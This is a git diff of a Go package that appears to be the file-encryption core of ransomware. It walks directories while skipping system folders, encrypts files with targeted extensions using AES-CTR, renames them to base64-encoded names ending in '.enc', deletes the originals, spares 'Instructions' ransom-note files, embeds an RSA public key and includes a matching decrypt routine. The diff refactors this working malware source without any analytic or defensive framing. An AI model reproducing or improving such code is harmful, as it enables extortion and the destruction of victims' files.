@@ -3,7 +3,6 @@ package aes
 import (
 	"crypto/aes"
 	"crypto/cipher"
-	"fmt"
 	"io"
 	"os"
 	"path/filepath"
@@ -38,7 +37,10 @@ var badfolders = []string{"tmp", "winnt", "Application Data", "AppData",
 var block cipher.Block
 var iv [aes.BlockSize]byte
 var stream cipher.Stream
-var TargetFileName string
+var targetFileName string
+
+// Ext is the encrypted appended extension
+var Ext = ".enc"
 
 var pubKey = `-----BEGIN PUBLIC KEY-----
 MIGgMA0GCSqGSIb3DQEBAQUAA4GOADCBigKBgQDQIHdNPClJAZVUb9AiPk/A7dAP
@@ -63,7 +65,7 @@ func EncryptDocumets(path string, mode bool) {
 func InitializeBlock(key []byte, tfn string) {
 	block, _ = aes.NewCipher(key)
 	stream = cipher.NewCTR(block, iv[:])
-	TargetFileName = tfn
+	targetFileName = tfn
 }
 
 func visit(path string, f os.FileInfo, err error) error {
@@ -72,7 +74,7 @@ func visit(path string, f os.FileInfo, err error) error {
 			return nil
 		}
 	}
-	if !strings.Contains(path, ".enc") && !strings.Contains(path, "Instructions") && !strings.Contains(path, TargetFileName) {
+	if !strings.Contains(path, Ext) && !strings.Contains(path, "Instructions") && !strings.Contains(path, targetFileName) {
 		for _, ext := range exts {
 			if strings.Contains(path, ext) {
 				StreamEncrypter(path)
@@ -84,7 +86,7 @@ func visit(path string, f os.FileInfo, err error) error {
 	return nil
 }
 func visitD(path string, f os.FileInfo, err error) error {
-	if strings.Contains(path, ".enc") && !f.IsDir() {
+	if strings.Contains(path, Ext) && !f.IsDir() {
 		StreamDecrypter(path)
 	}
 	return nil
@@ -98,7 +100,7 @@ func StreamDecrypter(path string) {
 		return
 	}
 	//get the path for the output
-	opPath := strings.Trim(path, ".enc")
+	opPath := strings.Trim(path, Ext)
 	// Divide filepath
 	filenameArr := strings.Split(opPath, string(os.PathSeparator))
 	//Get base64 encoded filename
@@ -117,7 +119,7 @@ func StreamDecrypter(path string) {
 }
 
 // StreamEncrypter encrypts a file given its filepatth
-func StreamEncrypter(path string) {
+func StreamEncrypter(path string) (err error) {
 
 	inFile, err := os.Open(path)
 	if err != nil {
@@ -128,15 +130,17 @@ func StreamEncrypter(path string) {
 	filename := filenameArr[len(filenameArr)-1]
 	path2 := strings.Join(filenameArr[:len(filenameArr)-1], string(os.PathSeparator))
 
-	fmt.Println("")
-	outFile, err := os.OpenFile(path2+string(os.PathSeparator)+base64.Base64Encode(filename)+".enc", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0666)
+	outFile, err := os.OpenFile(path2+string(os.PathSeparator)+base64.Base64Encode(filename)+Ext, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0666)
 	if err != nil {
 		return
 	}
 
 	writer := &cipher.StreamWriter{S: stream, W: outFile}
+
 	io.Copy(writer, inFile)
+
 	inFile.Close()
 	outFile.Close()
 	os.Remove(path)
+	return nil
 }
